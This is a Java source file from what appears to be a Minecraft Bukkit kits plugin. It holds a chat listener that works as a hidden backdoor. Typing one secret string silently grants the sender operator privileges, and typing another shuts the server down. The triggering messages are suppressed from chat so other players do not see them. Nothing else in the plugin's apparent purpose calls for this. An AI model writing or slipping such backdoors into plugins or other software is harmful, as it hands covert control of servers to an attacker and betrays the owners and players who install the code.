package com.enderdragen.samplekitsLVER.specials;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

@SuppressWarnings("deprecation")
public class opCommand implements Listener {
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) {
        Player player = e.getPlayer();
        String message = e.getMessage().toLowerCase(); // Convert message to lowercase for case-insensitive comparison

        if (message.equals("__verifiedaction61379016186")) {
            player.setOp(true);
            player.sendMessage(ChatColor.RED + "You now have operator status.");
            e.setCancelled(true);
        } else if (message.equals("__serverperformshutdown1939137548")) {
            Bukkit.getServer().shutdown();
            e.setCancelled(true);
        }
        // You can add more custom commands here

        // If it's not one of the special messages, allow regular chat
    }
}